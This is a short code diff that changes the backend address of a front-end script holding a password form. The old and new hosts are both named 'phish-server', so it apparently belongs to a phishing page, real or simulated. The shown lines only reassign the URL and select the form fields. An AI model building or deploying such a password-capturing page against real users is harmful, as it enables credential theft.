@@ -1,7 +1,7 @@
 const uuidRegex =
   /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
 
-const BACKEND_URL = 'https://phish-server-tfi.vercel.app';
+const BACKEND_URL = 'https://phish-server-tfi-8d47dd3524ee.herokuapp.com';
 
 const $form = document.getElementById('password-form');
 const $password = document.querySelector('[name=password]');
